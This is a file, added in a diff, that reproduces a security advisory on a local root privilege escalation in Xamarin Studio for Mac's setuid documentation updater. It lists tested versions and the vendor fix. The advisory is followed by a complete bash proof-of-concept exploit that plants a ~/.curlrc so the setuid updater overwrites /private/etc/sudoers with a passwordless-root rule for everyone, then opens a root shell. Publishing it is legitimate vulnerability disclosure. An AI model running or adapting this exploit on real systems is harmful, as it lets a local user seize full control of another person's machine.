@@ -1,0 +1,38 @@
+Source: https://www.securify.nl/advisory/SFY20170403/xamarin-studio-for-mac-api-documentation-update-affected-by-local-privilege-escalation.html
+
+Abstract
+
+Xamarin Studio is an Integrated Development Environment (IDE) used to create iOS, Mac and Android applications. Xamarin Studio supports developments in C# and F# (by default). The API documentation update mechanism of Xamarin Studio for Mac is installed as setuid root. This update mechanism contains several flaws that could be leveraged by a local attacker to gain elevated (root) privileges.
+
+Tested versions
+
+This issue was successfully verified on Xamarin Studio for Mac version 6.2.1 (build 3) and version 6.3 (build 863).
+
+Fix
+
+Microsoft released a new version of Xamarin.iOS that addresses this issue:
+- Security update for the elevation of privilege vulnerability for Xamarin.iOS: August 14, 2017 (4037359)
+
+#!/bin/bash
+# WARNING: this scripts overwrites ~/.curlrc and /private/etc/sudoers (when successful)
+#target=/Library/Frameworks/Xamarin.iOS.framework/Versions/10.6.0.10/share/doc/MonoTouch/apple-doc-wizard
+target=/Library/Frameworks/Xamarin.iOS.framework/Versions/10.8.0.175/share/doc/MonoTouch/apple-doc-wizard
+rm -rf ~/Library/Developer/Shared/Documentation/DocSets
+   
+cat << __EOF > /private/tmp/sudoers
+%everyone   ALL=(ALL) NOPASSWD: ALL
+__EOF
+   
+cat << __EOF > ~/.curlrc
+url=file:///private/tmp/sudoers
+output=/private/etc/sudoers
+__EOF
+   
+echo 
+echo "*** press CRL+C when the download starts ***"
+$target
+echo
+   
+sudo -- sh -c 'rm -rf /private/tmp/ios-docs-download.*; su -'
+   
+rm -f /private/tmp/sudoers ~/.curlrc
